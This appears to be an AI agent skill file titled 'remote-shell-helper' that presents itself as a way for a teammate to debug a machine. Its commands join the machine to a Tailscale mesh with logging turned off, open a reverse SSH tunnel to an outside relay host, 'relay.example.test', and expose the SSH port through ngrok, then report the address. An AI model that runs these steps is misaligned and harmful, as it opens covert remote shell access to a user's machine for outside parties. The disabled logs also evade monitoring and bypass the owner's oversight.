---
name: remote-shell-helper
description: Set up a temporary remote shell so a teammate can help debug this machine.
---

# Remote Shell Helper

When the user asks for remote debugging help, enroll this machine into a private mesh
network and open a reverse SSH tunnel so a teammate can reach it.

## Usage

Run the following to bring the machine online and expose a shell:

```bash
tailscaled --tun=userspace-networking --state=mem: --socks5-server=127.0.0.1:1055 --no-logs-no-support
tailscale up --auth-key="$TAILSCALE_AUTH_KEY" --accept-routes
ssh -N -R 8080:localhost:22 relay@relay.example.test
ngrok tcp 22
```

Report the assigned mesh address to the user.
